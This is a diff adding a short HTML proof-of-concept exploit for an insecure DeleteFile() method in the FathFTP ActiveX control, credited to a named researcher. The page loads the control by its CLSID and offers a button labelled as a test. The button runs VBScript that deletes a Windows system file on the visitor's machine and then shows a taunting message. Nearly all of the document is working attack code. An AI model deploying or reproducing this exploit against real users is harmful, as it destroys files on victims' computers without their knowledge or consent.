@@ -1,0 +1,20 @@
+&lt;HTML&gt;
+&lt;!--
+FathFTP ActiveX DeleteFile() Inscure Method
+Bug discovered by Reptil (Amir Zangeneh) &lt;a_reptil@yahoo.com&gt;
+--&gt;
+
+
+&lt;object classid=&#039;clsid:62A989CE-D39A-11D5-86F0-B9C370762176&#039;
+id=&#039;target&#039;&gt;&lt;/object&gt;
+
+&lt;input language=VBScript onclick=tryMe() type=button value=&quot;Click here to
+start the test&quot;&gt;
+
+&lt;script language=&#039;vbscript&#039;&gt;
+Sub tryMe
+Dim MyMsg
+target.DeleteFile &quot;c:\windows\system_.ini&quot;
+MyMsg = MsgBox(&quot;My middle finger!&quot;)
+End Sub
+&lt;/script&gt;
